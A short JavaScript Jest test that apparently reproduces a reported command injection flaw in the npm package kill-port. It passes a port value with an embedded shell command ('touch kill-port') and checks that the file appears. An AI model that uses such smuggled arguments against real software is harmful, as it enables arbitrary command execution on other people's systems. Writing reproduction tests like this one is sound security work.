//https://hackerone.com/reports/389561
test("Command Injection in kill-port", () => {
  const kill = require("kill-port");
  const fs = require("fs");
  const path = "./kill-port";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill("23;`touch kill-port; 2222222222`");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
